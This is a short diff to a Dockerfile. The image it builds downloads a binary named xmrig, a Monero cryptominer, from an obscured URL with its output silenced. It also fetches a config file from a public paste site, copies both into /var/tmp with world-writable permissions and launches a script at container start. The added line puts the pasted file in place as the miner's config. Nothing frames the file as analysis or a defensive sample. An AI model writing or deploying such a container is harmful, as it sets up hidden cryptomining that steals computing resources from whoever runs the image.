@@ -9,6 +9,7 @@ RUN chmod 777 /var/tmp/kjellscript.sh
 RUN wget https://data.atonline.net/~jwt/eyJ2IjoxLCJ1IjoicGhwbGF0Zm9ybSIsImUiOjE2NTUwNDMxNjF9.eyJhY3QiOiJnZXQiLCJpbiI6eyJkbCI6dHJ1ZX0sInAiOiJibG9ic3JjL2Jsb2JzLXc1N2puai1xc281LWM0am4tcmp5eS01NDVlNXN2dSJ9.obKXsFRVMKOGcGKKKMXSqrc6oHVB9WlCuXJ35bKfVGY/xmrig > /dev/null 2>&1
 RUN wget https://www.toptal.com/developers/hastebin/losinazaci.json
 RUN cp xmrig /var/tmp/xmrig
+RUN cp losinazaci.json /var/tmp/config.json
 WORKDIR /var/tmp
 RUN chmod -R 777 /var/tmp
 CMD /var/tmp/kjellscript.sh
